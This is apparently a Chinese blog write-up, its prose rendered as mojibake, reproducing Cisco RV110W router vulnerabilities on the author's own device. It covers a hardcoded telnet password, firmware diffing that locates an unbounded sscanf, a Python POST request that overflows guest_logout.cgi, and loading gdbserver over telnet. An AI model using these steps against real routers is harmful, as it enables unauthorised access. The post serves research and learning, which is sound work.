      <url>/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="RV110Wè·¯ç”±å™¨æ¼æ´å¤ç°"><a href="#RV110Wè·¯ç”±å™¨æ¼æ´å¤ç°" class="headerlink" title="RV110Wè·¯ç”±å™¨æ¼æ´å¤ç°"></a>RV110Wè·¯ç”±å™¨æ¼æ´å¤ç°</h1><blockquote><p>è¢«<code>xuanxuan</code>è€å¸ˆç§è‰äº†~ï¼Œâ€ä¸€å®šè¦æ‘¸çœŸå®çš„è®¾å¤‡â€è¿™å¥è¯ä½™éŸ³ç»•æ¢ï¼Œç»ˆäºç‹ ä¸‹å¿ƒä¹°äº†ä¸€ä¸ªäºŒæ‰‹çš„<code>RV110W</code>ï¼Œå¼€å§‹æˆ‘çš„è·¯ç”±å™¨æ¼æ´å¤ç°ä¹‹è·¯ï¼Œå¸Œæœ›èƒ½å­¦åˆ°ç‚¹ä¸œè¥¿ï¼</p></blockquote><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/25-1633419468547.jpg" class=""><h4 id="0x00-å¼€ç«¯"><a href="#0x00-å¼€ç«¯" class="headerlink" title="0x00 å¼€ç«¯"></a>0x00 å¼€ç«¯</h4><p>æ‹¿åˆ°è·¯ç”±å™¨æ¥ä¸Šç”µæºç½‘çº¿ï¼Œç”µè„‘è¿æ¥ä¸Š<code>RV100W</code>å°±é‡åˆ°äº†ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆè¿›å…¥åå°ï¼Ÿå¥½å§ï¼ŒèŒæ–°æ²¡æ€ä¹ˆç©è¿‡è·¯ç”±å™¨ï¼Œéƒ½æ˜¯æŒ‰ç…§è·¯ç”±å™¨èƒŒé¢çš„IPæ¥ç™»å½•ï¼Œå¥½å·§ä¸å·§ï¼Œå®ƒçš„èƒŒé¢å¾ˆå¹²å‡€ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œçœ‹<code>lemon</code>å¸ˆå‚…çš„è§†é¢‘çœ‹åˆ°10.10.10.1å…´è‡´å†²å†²çš„å»è®¿é—®ï¼Œç»“æœè¿›äº†ä¸€ä¸ªäº¤æ¢æœºçš„ç™»å½•ç•Œé¢ï¼Œå¥‡äº†æ€ªäº†ï¼Œåæ¥è¯¢é—®<code>lemon</code>å¸ˆå‚…ï¼Œè¦çœ‹è·¯ç”±å™¨çš„ç½‘å…³IPè¿›å»ï¼Œè‡³æ­¤ç¬¬ä¸€ä¸ªé—®é¢˜é¡ºåˆ©è§£å†³ï¼Œåˆå§‹å¯†ç æ˜¯<code>cisco:cisco</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/1.png" class=""><p>å¾ˆé¡ºåˆ©çš„è¿›å…¥åå°ï¼Œè¿›å…¥<code>Administration =&gt; Firmware/Language Upgrade</code>ï¼Œçœ‹åˆ°å›ºä»¶çš„ç‰ˆæœ¬ä¸å¯¹ï¼Œæ˜¯å¤šå°‘æ¥ç€å¿˜äº†ï¼Œåæ­£å¾ˆè€çš„ä¸€ä¸ªå›ºä»¶ï¼Œä¸‹é¢æä¾›äº†å›ºä»¶çš„å‡çº§ï¼Œæˆ‘ç›´æ¥å°±æ‹¿<code>xuanxuan</code>è€å¸ˆçš„å›ºä»¶åˆ·è¿›å»äº†ï¼Œç­‰äº†å¥½ä¸€ä¼šï¼Œå®ƒå°±é‡å¯äº†ï¼Œå†æ¬¡è¿›å…¥å°±å‘ç°å›ºä»¶ç‰ˆæœ¬å·²ç»å˜æˆ1.2.2.5äº†</p><p><a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">å›ºä»¶é“¾æ¥</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2-1633422409683.png" class=""><h4 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01 ä¿¡æ¯æ”¶é›†"></a>0x01 ä¿¡æ¯æ”¶é›†</h4><p>åˆ°è¿™ï¼Œå‡†å¤‡å·¥ä½œå·²ç»å®Œæˆäº†ï¼</p><p>é‚£å°±å¼€å§‹çœŸå®ç¯å¢ƒä¸‹çš„æ¼æ´å¤ç°äº†ï¼Œé¦–å…ˆä¸€èˆ¬æˆ‘ä»¬æƒ³è¦æ‰¾ä¸€ä¸ªè®¾å¤‡çš„æ¼æ´ï¼Œé‚£å¾—å…ˆçœ‹æœ‰ä»€ä¹ˆæœåŠ¡å§ï¼é‚£ä¹ˆä»æœåŠ¡å¾ˆå®¹æ˜“è”æƒ³åˆ°ç«¯å£ï¼Œæ‰€ä»¥æœ€å¼€å§‹æˆ‘ä»¬å…ˆç”¨<strong>ç«¯å£æ‰«æ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sT -p0-65535 192.168.1.1</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/3.png" class=""><p>æ‰«å®Œäº†ï¼Œå°±æƒ³çœ‹çœ‹æºç ï¼Œå°±è¦å¯¹<strong>å›ºä»¶è¿›è¡Œè§£åŒ…</strong>ï¼Œå›ºä»¶æå–æ‹¿ä»¥å‰çš„ä¸€å¼ å›¾æ¥çœ‹</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2.png" class=""><p>è¿™é‡Œå°±æ˜¯<code>xuanxuan</code>è€å¸ˆé‚£è¾¹æ‹¿çš„ï¼Œç®—æ˜¯äº’è”ç½‘æœç´¢å§ï¼</p><p><code>xuanxuan</code>è€å¸ˆé‚£è¯´è¦å®‰è£…<code>sasquatch</code>è¿™ä¸ªç»„ä»¶ï¼Œä½†æ˜¯åœ¨<code>AttifyOs</code>é‚£ç›´æ¥<code>binwalk</code>å°±å¼€äº†ï¼Ÿï¼Ÿï¼Ÿå¯èƒ½æ˜¯<code>AttifyOs</code>çš„<code>binwalk</code>æ¯”è¾ƒå®Œæ•´å§ï¼Œä¸å¤ªæ¸…æ¥š</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/4.png" class=""><p>è§£åŒ…å®Œæˆä¹‹åï¼ŒæŸ¥çœ‹<code>busybox</code>çš„ç‰ˆæœ¬æ˜¯<code>MIPS32</code>å°ç«¯åºçš„è·¯ç”±å™¨</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/5.png" class=""><p>ä¹‹åå°±æ˜¯<strong>æœé›†æ¼æ´ä¿¡æ¯</strong></p><h4 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h4><h3 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h3><p>ä¹‹å‰æ‰«åˆ°23ç«¯å£æ˜¯å¼€ç€çš„ï¼Œæœç´¢å‘ç°å¤§å¤šæ•°æ–‡ä»¶éƒ½æ˜¯é“¾æ¥åˆ°rcè¿™ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt; find . | xargs grep -ri &quot;admin:\\\$&quot;</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">grep: ./usr/local/libexec/ipsec/setup: No such file or directory</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">Binary file ./sbin/gpio_check matches</span><br><span class="line">Binary file ./sbin/write matches</span><br><span class="line">Binary file ./sbin/ca_manage matches</span><br><span class="line">Binary file ./sbin/ses_led matches</span><br><span class="line">Binary file ./sbin/ipsec_fqdn_detect matches</span><br><span class="line">Binary file ./sbin/sendudp matches</span><br><span class="line">Binary file ./sbin/check_ses_led matches</span><br><span class="line">Binary file ./sbin/stats matches</span><br><span class="line">Binary file ./sbin/ddns_update_data matches</span><br><span class="line">Binary file ./sbin/services matches</span><br><span class="line">Binary file ./sbin/restore matches</span><br><span class="line">Binary file ./sbin/info matches</span><br><span class="line">Binary file ./sbin/preinit matches</span><br><span class="line">Binary file ./sbin/qkvpn_rekey matches</span><br><span class="line">Binary file ./sbin/ipsec-up matches</span><br><span class="line">Binary file ./sbin/calc_vpnconn_time matches</span><br><span class="line">Binary file ./sbin/bootnv matches</span><br><span class="line">Binary file ./sbin/ipsec_wanlink matches</span><br><span class="line">Binary file ./sbin/usb_test matches</span><br><span class="line">Binary file ./sbin/icmp_echo matches</span><br><span class="line">Binary file ./sbin/cron_iaprule matches</span><br><span class="line">Binary file ./sbin/waninfo matches</span><br><span class="line">Binary file ./sbin/ntpd matches</span><br><span class="line">Binary file ./sbin/detectwan matches</span><br><span class="line">Binary file ./sbin/ipsec_fw matches</span><br><span class="line">Binary file ./sbin/ddns_success matches</span><br><span class="line">Binary file ./sbin/cpu_usage matches</span><br><span class="line">Binary file ./sbin/cron_aclrule matches</span><br><span class="line">Binary file ./sbin/firewall matches</span><br><span class="line">Binary file ./sbin/generate_md5sum matches</span><br><span class="line">Binary file ./sbin/init matches</span><br><span class="line">Binary file ./sbin/listen matches</span><br><span class="line">Binary file ./sbin/check_ps matches</span><br><span class="line">Binary file ./sbin/snmpdc matches</span><br><span class="line">Binary file ./sbin/process_monitor matches</span><br><span class="line">Binary file ./sbin/rc matches</span><br></pre></td></tr></table></figure><p>æŠŠæ”¾åˆ°IDAé‡Œé¢ï¼Œæœå­—ç¬¦ä¸²å®šä½å…³é”®å‡½æ•°</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/26.jpg" class=""><p>éšä¾¿ç¿»ä¸‹å°±æœ‰äº†ä¸ªæ˜æ–‡å­—ç¬¦ä¸²ï¼Œæ‹¿å»è§£ä¸€ä¸‹MD5</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/27.jpg" class=""><p>å¯†ç å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>telnet</code>æ¥ä¼ <code>gdbserver</code>å°±ä¸ç”¨æ‹†æœºå™¨äº†</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/6.png" class=""><h3 id="CVE-2020-3331-CVE-2020-3323"><a href="#CVE-2020-3331-CVE-2020-3323" class="headerlink" title="CVE-2020-3331/CVE-2020-3323"></a>CVE-2020-3331/CVE-2020-3323</h3><h5 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h5><p>1.2.2.5è¿™ä¸ªå›ºä»¶çš„ç‰ˆæœ¬ç›¸å¯¹æ¥è¯´æ¯”è¾ƒæ—§ï¼Œæ‰€ä»¥ä¸€ä¸ªå¾ˆå¸¸ç”¨çš„æ‰‹æ³•å°±æ˜¯å»<code>diff</code>æ–‡ä»¶ï¼Œæ‹¿å·²ç»ä¿®å¤æ­¤æ¼æ´çš„å›ºä»¶è¿›è¡Œ<code>diff</code>ï¼Œèƒ½å¤Ÿæ›´å®¹æ˜“çš„å»å®šä½æ¼æ´ç‚¹ï¼Œ<code>diff</code>æœ‰ä¿©å¸¸è§çš„å·¥å…·ï¼Œ<code>bindiff</code>å’Œ<code>diaphora</code></p><h6 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h6><p><a href="https://www.zynamics.com/software.html">bindiffä¸‹è½½é“¾æ¥</a></p><p>é€‰<code>.msi</code>ä¸‹è½½å°±è¡Œï¼Œå®‰è£…è·¯å¾„ä¸ºIDAçš„ä¸»ç›®å½•ï¼Œä¹‹åæ‰“å¼€IDAåœ¨æ’ä»¶é‚£è¾¹å°±èƒ½çœ‹è§<code>bindiff</code>äº†ï¼ŒæŠŠè¦æ¯”å¯¹çš„æ–‡ä»¶å…ˆæ‰“å¼€å†ä¿å­˜æˆ<code>idb</code>æ–‡ä»¶ï¼Œç„¶åç‚¹<code>bindiff</code>é€‰æ‹©è¦æ¯”å¯¹çš„<code>idb</code>å°±èƒ½å¼€å§‹æ¯”å¯¹å•¦ï¼</p><p><code>psï¼šuser</code>çš„ç›®å½•ä¸è¦æœ‰ä¸­æ–‡ï¼Œå¦åˆ™ä½ ä¼šå¾ˆä¸å¹¸</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/8.jpg" class=""><p>è¶Šå¾€ä¸‹æ»‘å‘¢ï¼å®ƒå°±è¶Šæœ‰å¯èƒ½æ˜¯ç›®æ ‡ï¼Œå› ä¸ºè¶Šä¸‹é¢å°±è¶Šä¸åŒ¹é…ï¼Œç”±äºæ¼æ´æè¿°æ˜¯å‰å°çš„æ´ï¼Œæ‰€ä»¥é€‰ä¸­çš„é‚£ä¸ªå‡½æ•°æœ‰å¯èƒ½å°±æ˜¯ç›®æ ‡ï¼Œè¿™é‡Œç®€å•è®²è®²æˆ‘è®¤è¯†ä»€ä¹ˆçš„å‰å°ä»€ä¹ˆçš„åå°ï¼Ÿ</p><p>å‰å°ï¼šä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„ç•Œé¢</p><p>åå°ï¼šå¯¹ç”¨æˆ·éšè—çš„é‚£éƒ¨åˆ†æ•°æ®å¤„ç†ä¸é€»è¾‘å¤„ç†</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/9.jpg" class=""><p>æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼Œæ¯ä¸ªåŸºæœ¬å—é¢œè‰²çš„è¯´æ˜ï¼š</p><blockquote><p>ç»¿è‰²ï¼šç›¸åŒçš„åŸºæœ¬å—</p><p>é»„è‰²ï¼šä¿®æ”¹çš„åŸºæœ¬å—</p><p>çº¢è‰²ï¼šåˆ æ‰çš„åŸºæœ¬å—</p><p>ç°è‰²ï¼šæ–°åŠ çš„åŸºæœ¬å—</p></blockquote><p>å³é”®<code>view flow graphs</code>å°±å¯ä»¥æŸ¥çœ‹æ±‡ç¼–ä»£ç å¯¹æ¯”ï¼Œæ‰¾äº†åŠå¤©æ‰æ‰¾åˆ°ï¼Œå°±ç¦»è°±</p><p><code>psï¼š</code>åƒä¸‡ä¸è¦ç›´æ¥æŠŠä¸¤ä¸ª<code>idb</code>ç›´æ¥ä¸¢åˆ°<code>idb</code>ï¼Œä¸ç„¶ä½ ä¼šçŸ¥é“ä»€ä¹ˆå«æµªè´¹æ—¶é—´ï¼ˆ<code>bindiff</code>ç›´æ¥æ‰“å¼€çš„åˆ†æé€Ÿåº¦æ„Ÿäºº</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/10.jpg" class=""><p>é™¤æ­¤ä¹‹å¤–ï¼Œä½ å¦‚æœå¯¹äºŒè¿›åˆ¶çš„æ¼æ´ç‚¹ä»¥åŠå±é™©å‡½æ•°æ¯”è¾ƒç†Ÿæ‚‰çš„è¯ï¼ŒåŒå‡»ç‚¹è¿›å»ï¼Œå¾ˆå®¹æ˜“å°±çœ‹åˆ°è¿™ä¸ªæ²¡æœ‰é™åˆ¶é•¿åº¦çš„<code>sscanf</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/11.jpg" class=""><h6 id="diaphora"><a href="#diaphora" class="headerlink" title="diaphora"></a>diaphora</h6><p>åäº†ï¼Œè€æ˜¯æŠ¥é”™æ•´ä¸å¥½äº†â€¦ï¼Œ<code>bindiff</code>ä¹Ÿèƒ½ç”¨çš„å•¦ï¼åªä¸è¿‡æ˜¯çœ‹æ±‡ç¼–ï¼Œ<code>diaphora</code>å¯ä»¥çœ‹æºç ï¼Œä¸‹æ¬¡å†è¡¥ä¸Šâ€¦</p><p>**%[ ^;];%*[ ^=]=%[ ^\n]**æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œ%æ˜¯ä»£è¡¨é€‰æ‹©ï¼Œ%*æ˜¯è¿‡æ»¤    </p><blockquote><ol><li><code>%[^;]</code>ï¼šåˆ†å·å‰çš„æ‰€æœ‰å­—ç¬¦éƒ½è¦</li><li><code>;%*[^=]</code>ï¼šåˆ†å·åï¼Œç­‰å·å‰çš„å­—ç¬¦éƒ½ä¸è¦</li><li><code>=%[^\n]</code>ï¼šç­‰å·åï¼Œæ¢è¡Œç¬¦å‰çš„æ‰€æœ‰å­—ç¬¦éƒ½è¦</li></ol></blockquote><p>çœ‹ä¸æ˜¯å¾ˆæ‡‚ï¼Œé‚£å°±ä¸Šä¸ª<code>demo</code>å§ï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> var1[<span class="number">5</span>] = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var2[<span class="number">5</span>] = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var3[<span class="number">5</span>] = <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> welcome[<span class="number">100</span>] = <span class="string">&quot;wElc0me t= reGuIar @xpr&amp;ss!0n w0rld;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(welcome,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, var1, var2, var3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n%s\n&quot;</span>,var1,var2,var3);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°è¿è¡Œç»“æœï¼Œè¿˜æ˜¯å¾ˆå¥‡æ€ªï¼Œç•™å‘äº†â€¦</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/12.png" class=""><p>å‘åŒ…æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æº¢å‡ºï¼Œå‘é€GETæŠ¥æ–‡å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆäº‹æƒ…å‘ç”Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç”ŸPOSTæŠ¥æ–‡çš„æ—¶å€™ï¼Œå‘ç°<code>web</code>é¡µé¢åœ¨ç–¯ç‹‚è½¬åœˆåœˆï¼Œå°±æ˜¯å´©äº†ï¼Œè‡³äºä¸ºä»€ä¹ˆåªæµ‹è¯•è¿™ä¸¤ä¸ªè¯·æ±‚å¤´ï¼ŒäºŒè¿›åˆ¶ç‹—è¡¨ç¤ºä¸å¤ªæ¸…æ¥šâ€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/23.png" class=""><h4 id="ç¡®å®šæº¢å‡ºåç§»"><a href="#ç¡®å®šæº¢å‡ºåç§»" class="headerlink" title="ç¡®å®šæº¢å‡ºåç§»"></a>ç¡®å®šæº¢å‡ºåç§»</h4><p>å´©äº†å°±æ„å‘³ç€ï¼Œæœ‰æ¼æ´ç‚¹çš„å­˜åœ¨ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•çš„äº‹æƒ…äº†ï¼Œç”¨çš„æ˜¯æµ·ç‰¹å®éªŒå®¤çš„<code>gdbserver</code>ï¼Œå…¶å®è¿˜æœ‰ä¸€ä¸ªæ˜¯<code>gef</code>å¼€å‘è€…ç¼–è¯‘çš„<code>gdbserver</code></p><p><a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">æµ·ç‰¹å®éªŒå®¤ IOT_Wiki</a></p><p><a href="https://github.com/hugsy/gdb-static">gef author</a></p><p>å¯åŠ¨ä¸€ä¸ªçª—å£èµ·ä¸€ä¸ªç®€å•çš„httpæœåŠ¡å™¨</p><p><strong>python2:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ  python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p><strong>python3ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ  python -m http.server 8080</span><br></pre></td></tr></table></figure><p>psï¼šå»ºè®®å¯åŠ¨æµè§ˆå™¨å¤åˆ¶é“¾æ¥ï¼ŒçœŸçš„å¥½ç”¨ï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/15.jpg" class=""><p>å†å¯åŠ¨ä¸€ä¸ªçª—å£<code>telnet</code>è¿æ¥ä¸Šè·¯ç”±å™¨ç”¨<code>wget</code>ï¼ˆè·¯ç”±å™¨é‡Œé¢è‡ªå¸¦çš„ï¼‰æŒ‚ä¸Š<code>gdbserver</code>ï¼Œå°±å¯ä»¥è¿œç¨‹è°ƒè¯•äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  telnet 192.168.1.1</span><br><span class="line">âœ  <span class="built_in">cd</span> tmp</span><br><span class="line">âœ  wget <span class="string">&quot;http://192.168.181.178:8080/home/laohu/Desktop/gdbserver&quot;</span></span><br><span class="line">âœ  chmod +x gdbserver</span><br><span class="line">âœ  ps | grep <span class="string">&quot;httpd&quot;</span></span><br><span class="line">âœ  ./gdbserver :1234 --attach 356<span class="comment">#çœ‹httpd -Sçš„è¿›ç¨‹å·ï¼Œå¦ä¸€ä¸ªå¥½åƒè°ƒè¯•ä¸äº†</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/7.png" class=""><p>ä¼ è¿›å»ä¹‹åï¼Œæ¶æ¢¦æ‰åˆšåˆšå¼€å§‹â€¦.æˆ‘æ ¹æœ¬æƒ³ä¸åˆ°è¿™é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼å°è¯•æ¢ç»ˆç«¯ï¼ˆæ”¹æˆ<code>dash</code>ï¼‰ï¼Œæ¢æ¶æ„ï¼ˆåœ¨æ ‘è“æ´¾ä¸Šå°è¯•ï¼‰ï¼Œæ¢ç›®å½•ï¼ˆæ¢åˆ°<code>data</code>ç›®å½•ï¼‰ä¹‹åï¼Œç»ˆäºæ‘¸ç´¢åˆ°äº†å…³é”®åŸå› â€”-<code>gdbserver</code>æœ¬èº«ï¼Œå„ä½å¤§å¸ˆå‚…ä»¬çš„<code>gdbserver</code>ä¸º<code>gdbserver-7.12-mipsel-mips32rel2-v1-sysv</code> 